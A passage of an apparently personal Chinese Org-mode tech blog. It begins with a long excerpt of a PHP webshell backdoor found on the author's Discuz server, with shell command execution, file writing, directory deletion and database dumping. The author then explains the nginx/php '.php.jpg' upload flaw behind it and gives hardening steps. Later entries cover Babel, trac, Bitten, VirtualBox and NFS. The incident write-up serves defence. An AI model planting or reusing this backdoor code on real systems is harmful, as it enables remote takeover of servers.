            echo '<div style="margin:10px auto 15px auto;background:#ffffe0;border:1px solid #e6db55;padding:10px;font:14px;text-align:center;font-weight:bold;">';
            echo $msg;
            echo '</div>';
        }
        function scookie($key, $value, $life = 0, $prefix = 1) {
            global $timestamp, $_SERVER, $cookiepre, $cookiedomain, $cookiepath, $cookielife;
            $key = ($prefix ? $cookiepre : '').$key;
            $life = $life ? $life : $cookielife;
            $useport = $_SERVER['SERVER_PORT'] == 443 ? 1 : 0;
            setcookie($key, $value, $timestamp+$life, $cookiepath, $cookiedomain, $useport);
        }   
        function multi($num, $perpage, $curpage, $tablename) {
            $multipage = '';
            if($num > $perpage) {
                $page = 10;
                $offset = 5;
                $pages = @ceil($num / $perpage);
                if($page > $pages) {
                    $from = 1;
                    $to = $pages;
                } else {
                    $from = $curpage - $offset;
                    $to = $curpage + $page - $offset - 1;
                    if($from < 1) {
                        $to = $curpage + 1 - $from;
                        $from = 1;
                        if(($to - $from) < $page && ($to - $from) < $pages) {
                            $to = $page;
                        }
                    } elseif($to > $pages) {
                        $from = $curpage - $pages + $to;
                        $to = $pages;
                        if(($to - $from) < $page && ($to - $from) < $pages) {
                            $from = $pages - $page + 1;
                        }
                    }
                }
                $multipage = ($curpage - $offset > 1 && $pages > $page ? '<a href="javascript:settable(\''.$tablename.'\', \'\', 1);">First</a> ' : '').($curpage > 1 ? '<a href="javascript:settable(\''.$tablename.'\', \'\', '.($curpage - 1).');">Prev</a> ' : '');
                for($i = $from; $i <= $to; $i++) {
                    $multipage .= $i == $curpage ? $i.' ' : '<a href="javascript:settable(\''.$tablename.'\', \'\', '.$i.');">['.$i.']</a> ';
                }
                $multipage .= ($curpage < $pages ? '<a href="javascript:settable(\''.$tablename.'\', \'\', '.($curpage + 1).');">Next</a>' : '').($to < $pages ? ' <a href="javascript:settable(\''.$tablename.'\', \'\', '.$pages.');">Last</a>' : '');
                $multipage = $multipage ? '<p>Pages: '.$multipage.'</p>' : '';
            }
            return $multipage;
        }
        // 登陆入口
        function loginpage() {
        ?>
            <style type="text/css">
            input {font:11px Verdana;BACKGROUND: #FFFFFF;height: 18px;border: 1px solid #666666;}
            </style>
            <form method="POST" action="">
            <span style="font:11px Verdana;">Password: </span><input name="password" type="password" size="20">
            <input type="hidden" name="action" value="login">
            <input type="submit" value="Login">
            </form>
        <?php
            exit;
        }//end loginpage()
        
        function execute($cfe) {
            $res = '';
            if ($cfe) {
                if(function_exists('system')) {
                    @ob_start();
                    @system($cfe);
                    $res = @ob_get_contents();
                    @ob_end_clean();
                } elseif(function_exists('passthru')) {
                    @ob_start();
                    @passthru($cfe);
                    $res = @ob_get_contents();
                    @ob_end_clean();
                } elseif(function_exists('shell_exec')) {
                    $res = @shell_exec($cfe);
                } elseif(function_exists('exec')) {
                    @exec($cfe,$res);
                    $res = join("\n",$res);
                } elseif(@is_resource($f = @popen($cfe,"r"))) {
                    $res = '';
                    while(!@feof($f)) {
                        $res .= @fread($f,1024); 
                    }
                    @pclose($f);
                }
            }
            return $res;
        }
        function which($pr) {
            $path = execute("which $pr");
            return ($path ? $path : $pr); 
        }
        
        function cf($fname,$text){
            if($fp=@fopen($fname,'w')) {
                @fputs($fp,@base64_decode($text));
                @fclose($fp);
            }
        }
        function dirsize($dir) { 
            $dh = @opendir($dir);
            $size = 0;
            while($file = @readdir($dh)) {
                if ($file != '.' && $file != '..') {
                    $path = $dir.'/'.$file;
                    $size += @is_dir($path) ? dirsize($path) : @filesize($path);
                }
            }
            @closedir($dh);
            return $size;
        }
        // 页面调试信息
        function debuginfo() {
            global $starttime;
            $mtime = explode(' ', microtime());
            $totaltime = number_format(($mtime[1] + $mtime[0] - $starttime), 6);
            echo 'Processed in '.$totaltime.' second(s)';
        }
        
        //连接MYSQL数据库
        function mydbconn($dbhost,$dbuser,$dbpass,$dbname='',$charset='',$dbport='3306') {
            global $charsetdb;
            @ini_set('mysql.connect_timeout', 5);
            if(!$link = @mysql_connect($dbhost.':'.$dbport, $dbuser, $dbpass)) {
                p('<h2>Can not connect to MySQL server</h2>');
                exit;
            }
            if($link && $dbname) {
                if (!@mysql_select_db($dbname, $link)) {
                    p('<h2>Database selected has error</h2>');
                    exit;
                }
            }
            if($link && mysql_get_server_info() > '4.1') {
                if($charset && in_array(strtolower($charset), $charsetdb)) {
                    q("SET character_set_connection=$charset, character_set_results=$charset, character_set_client=binary;", $link);
                }
            }
            return $link;
        }
        
        // 去掉转义字符
        function s_array(&$array) {
            if (is_array($array)) {
                foreach ($array as $k => $v) {
                    $array[$k] = s_array($v);
                }
            } else if (is_string($array)) {
                $array = stripslashes($array);
            }
            return $array;
        }
        
        // 清除HTML代码
        function html_clean($content) {
            $content = htmlspecialchars($content);
            $content = str_replace("\n", "<br />", $content);
            $content = str_replace("  ", "&nbsp;&nbsp;", $content);
            $content = str_replace("\t", "&nbsp;&nbsp;&nbsp;&nbsp;", $content);
            return $content;
        }
        
        // 获取权限
        function getChmod($filepath){
            return substr(base_convert(@fileperms($filepath),10,8),-4);
        }
        
        function getPerms($filepath) {
            $mode = @fileperms($filepath);
            if (($mode & 0xC000) === 0xC000) {$type = 's';}
            elseif (($mode & 0x4000) === 0x4000) {$type = 'd';}
            elseif (($mode & 0xA000) === 0xA000) {$type = 'l';}
            elseif (($mode & 0x8000) === 0x8000) {$type = '-';} 
            elseif (($mode & 0x6000) === 0x6000) {$type = 'b';}
            elseif (($mode & 0x2000) === 0x2000) {$type = 'c';}
            elseif (($mode & 0x1000) === 0x1000) {$type = 'p';}
            else {$type = '?';}
        
            $owner['read'] = ($mode & 00400) ? 'r' : '-'; 
            $owner['write'] = ($mode & 00200) ? 'w' : '-'; 
            $owner['execute'] = ($mode & 00100) ? 'x' : '-'; 
            $group['read'] = ($mode & 00040) ? 'r' : '-'; 
            $group['write'] = ($mode & 00020) ? 'w' : '-'; 
            $group['execute'] = ($mode & 00010) ? 'x' : '-'; 
            $world['read'] = ($mode & 00004) ? 'r' : '-'; 
            $world['write'] = ($mode & 00002) ? 'w' : '-'; 
            $world['execute'] = ($mode & 00001) ? 'x' : '-'; 
        
            if( $mode & 0x800 ) {$owner['execute'] = ($owner['execute']=='x') ? 's' : 'S';}
            if( $mode & 0x400 ) {$group['execute'] = ($group['execute']=='x') ? 's' : 'S';}
            if( $mode & 0x200 ) {$world['execute'] = ($world['execute']=='x') ? 't' : 'T';}
         
            return $type.$owner['read'].$owner['write'].$owner['execute'].$group['read'].$group['write'].$group['execute'].$world['read'].$world['write'].$world['execute'];
        }
        
        function getUser($filepath)     {
            if (function_exists('posix_getpwuid')) {
                $array = @posix_getpwuid(@fileowner($filepath));
                if ($array && is_array($array)) {
                    return ' / <a href="#" title="User: '.$array['name'].'&#13&#10Passwd: '.$array['passwd'].'&#13&#10Uid: '.$array['uid'].'&#13&#10gid: '.$array['gid'].'&#13&#10Gecos: '.$array['gecos'].'&#13&#10Dir: '.$array['dir'].'&#13&#10Shell: '.$array['shell'].'">'.$array['name'].'</a>';
                }
            }
            return '';
        }
        
        // 删除目录
        function deltree($deldir) {
            $mydir=@dir($deldir);   
            while($file=$mydir->read())     {       
                if((is_dir($deldir.'/'.$file)) && ($file!='.') && ($file!='..')) { 
                    @chmod($deldir.'/'.$file,0777);
                    deltree($deldir.'/'.$file); 
                }
                if (is_file($deldir.'/'.$file)) {
                    @chmod($deldir.'/'.$file,0777);
                    @unlink($deldir.'/'.$file);
                }
            } 
            $mydir->close(); 
            @chmod($deldir,0777);
            return @rmdir($deldir) ? 1 : 0;
        }
        
        // 表格行间的背景色替换
        function bg() {
            global $bgc;
            return ($bgc++%2==0) ? 'alt1' : 'alt2';
        }
        
        // 获取当前的文件系统路径
        function getPath($scriptpath, $nowpath) {
            if ($nowpath == '.') {
                $nowpath = $scriptpath;
            }
            $nowpath = str_replace('\\', '/', $nowpath);
            $nowpath = str_replace('//', '/', $nowpath);
            if (substr($nowpath, -1) != '/') {
                $nowpath = $nowpath.'/';
            }
            return $nowpath;
        }
        
        // 获取当前目录的上级目录
        function getUpPath($nowpath) {
            $pathdb = explode('/', $nowpath);
            $num = count($pathdb);
            if ($num > 2) {
                unset($pathdb[$num-1],$pathdb[$num-2]);
            }
            $uppath = implode('/', $pathdb).'/';
            $uppath = str_replace('//', '/', $uppath);
            return $uppath;
        }
        
        // 检查PHP配置参数
        function getcfg($varname) {
            $result = get_cfg_var($varname);
            if ($result == 0) {
                return 'No';
            } elseif ($result == 1) {
                return 'Yes';
            } else {
                return $result;
            }
        }
        
        // 检查函数情况
        function getfun($funName) {
            return (false !== function_exists($funName)) ? 'Yes' : 'No';
        }
        
        // 获得文件扩展名
        function getext($file) {
            $info = pathinfo($file);
            return $info['extension'];
        }
        
        function GetWDirList($dir){
            global $dirdata,$j,$nowpath;
            !$j && $j=1;
            if ($dh = opendir($dir)) {
                while ($file = readdir($dh)) {
                    $f=str_replace('//','/',$dir.'/'.$file);
                    if($file!='.' && $file!='..' && is_dir($f)){
                        if (is_writable($f)) {
                            $dirdata[$j]['filename']=str_replace($nowpath,'',$f);
                            $dirdata[$j]['mtime']=@date('Y-m-d H:i:s',filemtime($f));
                            $dirdata[$j]['dirchmod']=getChmod($f);
                            $dirdata[$j]['dirperm']=getPerms($f);
                            $dirdata[$j]['dirlink']=$dir;
                            $dirdata[$j]['server_link']=$f;
                            $j++;
                        }
                        GetWDirList($f);
                    }
                }
                closedir($dh);
                clearstatcache();
                return $dirdata;
            } else {
                return array();
            }
        }
        
        function GetWFileList($dir){
            global $filedata,$j,$nowpath, $writabledb;
            !$j && $j=1;
            if ($dh = opendir($dir)) {
                while ($file = readdir($dh)) {
                    $ext = getext($file);
                    $f=str_replace('//','/',$dir.'/'.$file);
                    if($file!='.' && $file!='..' && is_dir($f)){
                        GetWFileList($f);
                    } elseif($file!='.' && $file!='..' && is_file($f) && in_array($ext, explode(',', $writabledb))){
                        if (is_writable($f)) {
                            $filedata[$j]['filename']=str_replace($nowpath,'',$f);
                            $filedata[$j]['size']=sizecount(@filesize($f));
                            $filedata[$j]['mtime']=@date('Y-m-d H:i:s',filemtime($f));
                            $filedata[$j]['filechmod']=getChmod($f);
                            $filedata[$j]['fileperm']=getPerms($f);
                            $filedata[$j]['fileowner']=getUser($f);
                            $filedata[$j]['dirlink']=$dir;
                            $filedata[$j]['server_link']=$f;
                            $j++;
                        }
                    }
                }
                closedir($dh);
                clearstatcache();
                return $filedata;
            } else {
                return array();
            }
        }
        
        function GetSFileList($dir, $content, $re = 0) {
            global $filedata,$j,$nowpath, $writabledb;
            !$j && $j=1;
            if ($dh = opendir($dir)) {
                while ($file = readdir($dh)) {
                    $ext = getext($file);
                    $f=str_replace('//','/',$dir.'/'.$file);
                    if($file!='.' && $file!='..' && is_dir($f)){
                        GetSFileList($f, $content, $re = 0);
                    } elseif($file!='.' && $file!='..' && is_file($f) && in_array($ext, explode(',', $writabledb))){
                        $find = 0;
                        if ($re) {
                            if ( preg_match('@'.$content.'@',$file) || preg_match('@'.$content.'@', @file_get_contents($f)) ){
                                $find = 1;
                            }
                        } else {
                            if ( strstr($file, $content) || strstr( @file_get_contents($f),$content ) ) {
                                $find = 1;
                            }
                        }
                        if ($find) {
                            $filedata[$j]['filename']=str_replace($nowpath,'',$f);
                            $filedata[$j]['size']=sizecount(@filesize($f));
                            $filedata[$j]['mtime']=@date('Y-m-d H:i:s',filemtime($f));
                            $filedata[$j]['filechmod']=getChmod($f);
                            $filedata[$j]['fileperm']=getPerms($f);
                            $filedata[$j]['fileowner']=getUser($f);
                            $filedata[$j]['dirlink']=$dir;
                            $filedata[$j]['server_link']=$f;
                            $j++;
                        }
                    }
                }
                closedir($dh);
                clearstatcache();
                return $filedata;
            } else {
                return array();
            }
        }
        
        function qy($sql) { 
            global $mysqllink;
            //echo $sql.'<br>';
            $res = $error = '';
            if(!$res = @mysql_query($sql,$mysqllink)) { 
                return 0;
            } else if(is_resource($res)) {
                return 1; 
            } else {
                return 2;
            }   
            return 0;
        }
        
        function q($sql) { 
            global $mysqllink;
            return @mysql_query($sql,$mysqllink);
        }
        
        function fr($qy){
            mysql_free_result($qy);
        }
        
        function sizecount($fileSize) {
            $size = sprintf("%u", $fileSize);
            if($size == 0) {
                return '0 Bytes' ;
            }
            $sizename = array(' Bytes', ' KB', ' MB', ' GB', ' TB', ' PB', ' EB', ' ZB', ' YB');
            return round( $size / pow(1024, ($i = floor(log($size, 1024)))), 2) . $sizename[$i];
        }
        // 备份数据库
        function sqldumptable($table, $fp=0) {
            global $mysqllink;
        
            $tabledump = "DROP TABLE IF EXISTS `$table`;\n";
            $res = q("SHOW CREATE TABLE $table");
            $create = mysql_fetch_row($res);
            $tabledump .= $create[1].";\n\n";
        
            if ($fp) {
                fwrite($fp,$tabledump);
            } else {
                echo $tabledump;
            }
            $tabledump = '';
            $rows = q("SELECT * FROM $table");
            while ($row = mysql_fetch_assoc($rows)) {
                foreach($row as $k=>$v) {
                    $row[$k] = "'".@mysql_real_escape_string($v)."'";
                }
                $tabledump = 'INSERT INTO `'.$table.'` VALUES ('.implode(", ", $row).');'."\n";
                if ($fp) {
                    fwrite($fp,$tabledump);
                } else {
                    echo $tabledump;
                }
            }
            fwrite($fp,"\n\n");
            fr($rows);
        }
        
        function p($str){
            echo $str."\n";
        }
        
        function tbhead() {
            p('<table width="100%" border="0" cellpadding="4" cellspacing="0">');
        }
        function tbfoot(){
            p('</table>');
        }
        
        function makehide($name,$value=''){
            p("<input id=\"$name\" type=\"hidden\" name=\"$name\" value=\"$value\" />");
        }
        
        function makeinput($arg = array()){
            $arg['size'] = $arg['size'] > 0 ? "size=\"$arg[size]\"" : "size=\"100\"";
            $arg['extra'] = $arg['extra'] ? $arg['extra'] : '';
            !$arg['type'] && $arg['type'] = 'text';
            $arg['title'] = $arg['title'] ? $arg['title'].'<br />' : '';
            $arg['class'] = $arg['class'] ? $arg['class'] : 'input';
            if ($arg['newline']) {
                p("<p>$arg[title]<input class=\"$arg[class]\" name=\"$arg[name]\" id=\"$arg[name]\" value=\"$arg[value]\" type=\"$arg[type]\" $arg[size] $arg[extra] /></p>");
            } else {
                p("$arg[title]<input class=\"$arg[class]\" name=\"$arg[name]\" id=\"$arg[name]\" value=\"$arg[value]\" type=\"$arg[type]\" $arg[size] $arg[extra] />");
            }
        }
        
        function makeselect($arg = array()){
            if ($arg['onchange']) {
                $onchange = 'onchange="'.$arg['onchange'].'"';
            }
            $arg['title'] = $arg['title'] ? $arg['title'] : '';
            if ($arg['newline']) p('<p>');
            p("$arg[title] <select class=\"input\" id=\"$arg[name]\" name=\"$arg[name]\" $onchange>");
                if (is_array($arg['option'])) {
                    if ($arg['nokey']) {
                        foreach ($arg['option'] as $value) {
                            if ($arg['selected']==$value) {
                                p("<option value=\"$value\" selected>$value</option>");
                            } else {
                                p("<option value=\"$value\">$value</option>");
                            }
                        }
                    } else {
                        foreach ($arg['option'] as $key=>$value) {
                            if ($arg['selected']==$key) {
                                p("<option value=\"$key\" selected>$value</option>");
                            } else {
                                p("<option value=\"$key\">$value</option>");
                            }
                        }
                    }
                }
            p("</select>");
            if ($arg['newline']) p('</p>');
        }
        function formhead($arg = array()) {
            global $self;
            !$arg['method'] && $arg['method'] = 'post';
            !$arg['action'] && $arg['action'] = $self;
            $arg['target'] = $arg['target'] ? "target=\"$arg[target]\"" : '';
            !$arg['name'] && $arg['name'] = 'form1';
            p("<form name=\"$arg[name]\" id=\"$arg[name]\" action=\"$arg[action]\" method=\"$arg[method]\" $arg[target]>");
            if ($arg['title']) {
                p('<h2>'.$arg['title'].' &raquo;</h2>');
            }
        }
            
        function maketext($arg = array()){
            !$arg['cols'] && $arg['cols'] = 100;
            !$arg['rows'] && $arg['rows'] = 25;
            $arg['title'] = $arg['title'] ? $arg['title'].'<br />' : '';
            p("<p>$arg[title]<textarea class=\"area\" id=\"$arg[name]\" name=\"$arg[name]\" cols=\"$arg[cols]\" rows=\"$arg[rows]\" $arg[extra]>$arg[value]</textarea></p>");
        }
        
        function formfooter($name = ''){
            !$name && $name = 'submit';
            p('<p><input class="bt" name="'.$name.'" id="'.$name.'" type="submit" value="Submit"></p>');
            p('</form>');
        }
        
        function goback(){
            global $self, $nowpath;
            p('<form action="'.$self.'" method="post"><input type="hidden" name="action" value="file" /><input type="hidden" name="dir" value="'.$nowpath.'" /><p><input class="bt" type="submit" value="Go back..."></p></form>');
        }
        
        function formfoot(){
            p('</form>');
        }
        
        function encode_pass($pass) {
            $pass = md5('angel'.$pass);
            $pass = md5($pass.'angel');
            $pass = md5('angel'.$pass.'angel');
            return $pass;
        }
        
        function pr($s){
            echo "<pre>".print_r($s).'</pre>';
        }
        
        ?>
      #+end_src

      上面的脚本被恶意用户完成对系统的远程控制。

*** 问题根源
    
    这次发现的恶意代码注入应该是之前的一次 =nginx= 和 =php= [[http://www.oschina.net/translate/10-tips-for-securing-nginx#translate_28443][安全漏洞]] 引起，当时由 =WooYun.org= 汇报，原来已经被恶意用户种下了这些后门。

    这个漏洞简言之就是用户可以上传文件后缀为 =.php.jpg= 的文件，在外部访问时直接被当做 =php= 执行，罪魁祸首归结为以下三点：

    - =php= 配置
      
    - =nginx= 配置
      
    - =discuz=

      允许上传文件名指定后缀为 =.php.jpg=

*** 加固措施
    
    - 采用更严格的文件目录权限

      + 列出属主不应该为 =nobody= 的目录：

        #+begin_src sh
          find . -type d  | xargs ls -lad | grep nobody | grep -v '/data'
        #+end_src
      
        除 =discuz= 要求为可写的目录（路径名包启/data）外，其它所有文件及目录属主都改为非 =nobody= 用户。
        
        需要注意的是 =source/plugin/= 下的所有目录需要为所有用户添加上可执行权限（特别是自已开发并上传解压的插件），否则访问插件时会出现以下错误提示：

        #+begin_example
          指定的插件模块文件(XXXXXXXXXX)不存在或存在语法错误，请检查是否已将插件完整上传
        #+end_example

      + 列出属主不应该为 =nobody= 的文件：

        #+begin_src sh
          find . -type f  | xargs ls -la | grep nobody | grep -v '/data'
        #+end_src

        除 =discuz= 要求为可写的文件（路径名包启/data）外，其它所有文件属主都改为非 =nobody= 用户。

      + 列出 =nobody= 可写的文件
        
        #+begin_src sh
          find . -type f ! -perm 0644  | xargs ls -la | grep -v '/data/'
        #+end_src
        
        收回非必要的写权限。

    - 确保上传目录中的 =php= 文件不会被当做 =php= 执行

      + data/attachment
      + uc_server/data/avatar
      + uc_server/data/tmp

** DONE python应用国际化：Babel                                :python:babel:
   CLOSED: [2014-03-09 Sun 19:54]
   :PROPERTIES:
   :PAGE:     index.html
   :TEMPLATE: blog_static_no_title.html
   :END:

   [[http://babel.pocoo.org/][Babel]] 是 =Python= 的一个国际化工具包，原本为[[Edgewall.org]]下的一个项目，现在已经转为由[[pocoo.org]]维护。
   
*** 统一管理 =Python= 虚拟环境
    
    #+begin_src sh
      yaourt -S python-virtualenvwrapper
      mkdir $HOME/.virtualenvs
      echo 'export WORKON_HOME=$HOME/.virtualenvs' >> ~/.bashrc
      echo 'source virtualenvwrapper.sh' >> ~/.bashrc
      source ~/.bashrc
    #+end_src

*** 建立学习 =Babel= 专用虚拟环境

    #+begin_src sh
      mkvirtualenv --python=/usr/bin/python2 --no-site-packages LearnBabel
    #+end_src

*** 编译安装 =Babel=

    #+begin_src sh
      git clone https://github.com/mitsuhiko/babel.git
      cd babel
      pip install pytz
      python setup.py import_cldr
      pip install --editable .
    #+end_src
   
*** 常用信息国际化

    #+begin_example
      >>> from babel import Locale
      >>> locale = Locale('en', 'US')
      >>> print locale.territories['CN']
      China
      >>> locale = Locale('zh')
      >>> print locale.territories['CN']
      中国
      >>> month_names = locale.months['format']['wide'].items()
      >>> for idx, name in sorted(month_names):
      ...   print name
      ... 
      一月
      二月
      三月
      四月
      五月
      六月
      七月
      八月
      九月
      十月
      十一月
      十二月
      >>> from datetime import date
      >>> from babel.dates import format_date
      >>> today = date.today()
      >>> print format_date(today, locale='zh')
      2014年3月9日
    #+end_example

*** 任意信息国际化

    - 创建python程序： =hello.py=

      #+begin_src python
        import gettext
        gettext.bindtextdomain('messages', './hello.i18n')
        _ = gettext.gettext
        print _('Hello')
      #+end_src

    - 创建Babel配置文件： =hello.babel=

      #+begin_example
        [python: hello.py]
      #+end_example

    - 准备翻译成中文

      #+begin_src sh
        mkdir hello.i18n
        pybabel extract -F hello.babel . -o hello.i18n/messages.pot    # 从源代码中提取可翻译的文本到POT（PO模板）文件
        pybabel init -l zh_CN -d ./hello.i18n -i ./hello.i18n/messages.pot    # 将POT文本拷贝出一份指定语言的PO文件
      #+end_src

    - 译成中文后的PO文件： =./hello.i18n/zh_CN/LC_MESSAGES/messages.po=

      #+begin_example
        # Chinese (Simplified, China) translations for PROJECT.
        # Copyright (C) 2014 ORGANIZATION
        # This file is distributed under the same license as the PROJECT project.
        # FIRST AUTHOR <EMAIL@ADDRESS>, 2014.
        #
        #, fuzzy
        msgid ""
        msgstr ""
        "Project-Id-Version: PROJECT VERSION\n"
        "Report-Msgid-Bugs-To: EMAIL@ADDRESS\n"
        "POT-Creation-Date: 2014-03-09 19:08+0800\n"
        "PO-Revision-Date: 2014-03-09 19:12+0800\n"
        "Last-Translator: FULL NAME <EMAIL@ADDRESS>\n"
        "Language-Team: zh_Hans_CN <LL@li.org>\n"
        "Plural-Forms: nplurals=2; plural=(n != 1)\n"
        "MIME-Version: 1.0\n"
        "Content-Type: text/plain; charset=utf-8\n"
        "Content-Transfer-Encoding: 8bit\n"
        "Generated-By: Babel 2.0-dev\n"
        
        #: hello.py:1
        msgid "Hello"
        msgstr "喂"
        
      #+end_example

    - 编译翻译结果

      #+begin_src sh
        pybabel compile -f -d ./hello.i18n    #编译PO文件为MO文件
      #+end_src
    
    - 英文环境下运行程序

      #+begin_example
        python ./hello.py
        Hello
      #+end_example

    - 中文环境下运行程序
      
      #+begin_example
        LC_ALL=zh_CN python ./hello.py
        喂
      #+end_example

    - 更新 =hello.py= ，追加一句“      print \_('World')”

    - 将“World”翻译成中文

      #+begin_src sh
        pybabel extract -F hello.babel . -o hello.i18n/messages.pot    # 从源代码中提取可翻译的文本到POT（PO模板）文件
        pybabel update -l zh_CN -d ./hello.i18n -i ./hello.i18n/messages.pot    # 从POT文本更新指定语言的PO文件
        # 开始翻译指定语言的PO文件： hello.i18n/zh_CN/LC_MESSAGES/messages.po
        pybabel compile -f -d ./hello.i18n    #编译PO文件为MO文件
      #+end_src

    - 再次运行

      #+begin_example
        LC_ALL=zh_CN python ./hello.py
        喂
        世界
      #+end_example    

    - 程序中强制使用中文语言： =hello.cn.py=
      
      #+begin_src python
        import gettext
        
        t = gettext.translation('messages', './hello.i18n', languages=['zh_CN'])
        _ = t.gettext
        
        print _('Hello')
        print _('World')
      #+end_src
     
    - 即使是在英文环境下也输出中文

      #+begin_example
        LC_ALL=en_US python ./hello.py
        喂
        世界
      #+end_example

** DONE 开源项目管理系统：trac                                  :python:trac:
   CLOSED: [2014-03-10 Mon 00:44]

   最近负责为公司搭建项目管理系统，有如下要求：
   - 支持BUG管理

   - 支持帐号管理

   - 支持WIKI

   - 支持任务分配

   - 支持中文

   由于时间紧迫，感觉 =redmine= 界面更漂亮，相关资料也好找，而且帐号管理、中文支持方面的很不错，所以选择了 =redmine= 。其实心里面一直希望选的是基于 =python= 开发的系统，一方面自已喜欢 =python= ，另外团队中对 =python= 熟悉的人比较多，这样后面需要做二次开发时会容易一些。

   =trac= 给人的第一感觉是太过于简单粗糙了。界面朴实简洁尚可接受、演示站点中文化不彻底、自已安装的时候较之 =redmine= 更是磕磕绊绊。=trac= 使用 =Babel= 进行多语言支持，当前的trac稳定版（1.0）存在中文支持方面的Bug：[[http://trac.edgewall.org/ticket/10903][Wrong `NullTranslations` class in functional tests]] ，我在安装过程中就遇到了，正是这个问题才觉得先研究一下 =Babel= ，于是有了上一篇文章 《[[http://blog.kankanan.com/posts/2014/03/09_python5e94752856fd96455316ff1ababel.html][python应用国际化：Babel]]》， =trac= 下一版（1.1）对这个问题进行了修复。 网络上有很多人对 =trac= 夸赞有加，另外 =trac= 还有持续集成的插件： [[http://bitten.edgewall.org/][Bitten]] ， 在对 =Babel= 有一定了解后，我终于鼓气勇气研究起 [[http://trac.edgewall.org/][trac]] 。

*** 安装最新版 =trac=

    - 使用学习 =Babel= 时建的虚拟环境
      
      #+begin_src sh
        workon LearnBabel
      #+end_src

    - 从最新源代码安装 =trac=
      
      #+begin_src sh
        svn checkout http://svn.edgewall.org/repos/trac/trunk trac
        cd trac
        python ./setup.py install
      #+end_src
   
    - 建一个项目看看效果
      
      #+begin_src sh
        cd ~/Examples/python
        trac-admin LearnTrac initenv
        tracd --port 8080 LearnTrac &
        xdg-open http://localhost:8080
      #+end_src

    感觉 =trac= 的中文化做得还不够彻底，但是关键的部位都已经中文化，不影响对整个系统的使用，有了 =Babel= 的经验之后对它进行中文化是很容易的，翻译后提交给 =trac= 开发人员，也算是回馈开源社区了。

*** 配置用户

    - 创建帐号文件 =LearnTrac/conf/users.digest=

      #+begin_src sh
        user=admin
        realm=localhost
        password=admin
        file=LearnTrac/conf/users.digest
        echo ${user}:${realm}:$(printf "${user}:${realm}:${password}" | md5sum - | sed -e 's/\s\+-//') >> ${file}
      #+end_src

    - 重新启动服务

      #+begin_src python
        tracd -p 8080 --auth="LearnTrac,LearnTrac/conf/users.digest,localhost" LearnTrac
      #+end_src

    现在可以使用 =admin= 帐号登录了

    帐号管理方面 =trac= 比较弱，只能通过 =trac-admin= 命令行工具来管理，小团队使用还是可以接受的，另外仅支持HTTP认证，配上HTTPS布署到外网也算是不错的选择。

*** 配置权限

    - 为 =admin= 用户赋予管理员权限

      #+begin_src python
        trac-admin LearnTrac permission add admin TRAC_ADMIN
      #+end_src

    现在可以在WEB界面上看到“管理”标签页了，可以在WEB界面上对权限进行配置。

** TODO 开源持续集成系统：Bitten                              :python:bitten:

    - 使用学习 =Babel= 时建的虚拟环境
      
      #+begin_src sh
        workon LearnBabel
      #+end_src

    - 从最新源代码安装 =Bitten=
      
      #+begin_src sh
        svn co http://svn.edgewall.org/repos/bitten/trunk bitten
        cd bitten
        python ./setup.py install
      #+end_src

    - 在 =Trac= 中启用 =Bitten=

      修改 =LearnTrac/conf/trac.ini= 中 =[components]= 下，添加：

      #+begin_src conf
        bitten.* = enabled
      #+end_src

    - 插件更新生效

      #+begin_src sh
        trac-admin LearnTrac upgrade
      #+end_src

    - 配置用户权限

      #+begin_src sh
        trac-admin LearnTrac permission add admin BUILD_ADMIN
        trac-admin LearnTrac permission add anonymous BUILD_VIEW
      #+end_src

    - 现在打开Web界面就可以看到“Build Status”标签页了
** TODO Web系统安全要点                                        :web:security:

   恶意用户注入代码到系统是很难避免的，正所谓百密一疏，关键是要限制注入的代码产生的影响。

   - 防止泄露用户敏感信息
     
     不保存用户的敏感信息，可采用第三方帐号系统。

   - 防止恶意用户取得 =root= 权限

     以 =nobody= 帐号运行服务。

   - 防止代码被侵入者篡改

     所有代码及相关资源属主不得为 =nobody= ，禁止 =nobody= 用户访问。

   - 防止执行用户上传的内容

     只允许脚本产生的文件及所在目录属主为 =nobody= ，且不会被执行。

     可以通过仔细配置Web服务器，确保用户上传目录中的文件不被当做脚本执行。

   - 防止威胁到其它服务
     
     限制服务器对外访问。

   - 主动监控
     
     监控执行 =www= 目录之外的脚本的行为；监控调用 =eval= 等危险函数的行为。

   - 及时升级系统
   
     主动从内部或外部进行漏洞扫描，以便及时发现系统软件漏洞并进行升级。
** TODO VirtualBox虚拟机增加磁盘空间                       :virtualbox:linux:

   以下步骤为关闭虚拟机后进行，需要增加新空间挂载到 =/home= 。

   - 首先增加磁盘文件空间

     #+begin_src sh
       VBoxManage modifyhd ~/VirtualBox\ VMs/Ubuntu\ 12.04/Ubuntu\ 12.04.vdi --resize 40000
     #+end_src

     上面的例子中增加磁盘大小到40G.

  - 下载Gparted Live CD
    
    #+begin_src sh
      wget http://softlayer-ams.dl.sourceforge.net/project/gparted/gparted-live-stable/0.18.0-1/gparted-live-0.18.0-1-i486.iso
    #+end_src
    
    参考：https://wiki.archlinux.org/index.php/Gparted-Live#Bootable_CD

  - 挂载Gparted Live CD ISO文件启动虚拟机

    打开VirtualBox，设置虚拟机，挂载ISO文件，启动虚拟机。

  - 启动Gparted

    扩大已有逻辑分区的尺寸以便包含新的未分配空间，使用未分配空间创建新的分区（本文采用ext4文件系统）。

    关闭虚拟机，卸载ISO，启动虚拟机。

  - 临时挂载新分区

    #+begin_src sh
      sudo mount /dev/sda6 /newhome
    #+end_src

  - 将旧内容拷入新分区挂载点

    #+begin_src sh
      sudo cp -a /home/* /newhome/
    #+end_src

  - 清空旧内容

    #+begin_src sh
      sudo rm -r /home
    #+end_src

  - 正式挂载新分区

    #+begin_src sh
      sudo umount /newhome
      sudo mv /newhome /home
      sudo mount /dev/sda6 /home
    #+end_src

  - 写入配置文件

    在 =/etc/fstab=中添加：

    #+begin_example
      /dev/sda6 /home ext4 defaults 0 2
    #+end_example
** TODO php与mysql疑难点                                          :php:mysql:

   - mysql_query进行update返回true表示记录更新成功吗？
     
** TODO linux挂载远程文件夹                                           :linux:

   - 挂载nfs文件夹

     #+begin_src sh
       mkdir /tmp/Projects; mount -t nfs -o nolock 192.168.111.100:/home/tangxinfa/Projects /tmp/Projects
     #+end_src
